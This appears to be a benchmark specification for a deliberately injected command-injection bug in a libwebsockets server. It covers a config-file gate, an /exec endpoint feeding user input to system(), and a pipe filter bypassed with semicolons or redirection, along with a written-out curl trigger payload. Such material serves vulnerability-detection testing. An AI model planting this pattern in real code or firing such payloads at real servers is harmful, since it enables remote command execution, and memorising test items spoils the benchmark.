DESCRIPTION:
  Config-file-gated command injection in libwebsockets server. Server started
  with --exec-config PATH; config file sets exec_mode=1 and exec_logging=1.
  User-supplied cmd flows directly into system(). S2 blocks pipe; bypass with
  semicolon.

CONFIG_GATE (C2 — config file):
  mechanism:  key=value config parsed by read_exec_config() via fopen/fgets/sscanf
              into struct exec_config { int enabled; int logging; char secret[64]; }
  check:      `exec_cfg.enabled && exec_cfg.logging` in LWS_CALLBACK_HTTP branch
  new CLI:    --exec-config PATH

INPUT_FLOW (I1 — direct):
  entry:      HTTP GET /exec?cmd=<payload>
  path:       handle_exec() reads cmd via lws_get_urlarg_by_name_safe(), passes
              directly to system(cmd)
  transforms: none

SANITIZATION (S2 — bypassable pipe filter):
  check:      if (strchr(cmd, '|') != NULL) reject HTTP_FORBIDDEN
  bypass:     use semicolon (;) or redirection (>) instead of pipe

SINK:        system() in handle_exec() (server.c)

CHANGED FILES:
  server.c — 3 hunks:
    1. globals:   exec_cfg struct, read_exec_config(), handle_exec()
    2. callback:  LWS_CALLBACK_HTTP branch checks exec_cfg gate, calls handle_exec()
    3. main():    --exec-config PATH argument added

EXPLOIT:
  config:  echo -e "exec_mode = 1\nexec_logging = 1" > /tmp/poc_185.conf
  start:   ./lws_server --port 18185 --exec-config /tmp/poc_185.conf
  trigger: curl 'http://127.0.0.1:18185/exec?cmd=id>/tmp/poc_185_marker'
  note:    S2 bypass: use > (no pipe needed)

  gate bypass: start without --exec-config; exec_cfg stays zeroed; /exec falls through to file serve (404)

NOTES:
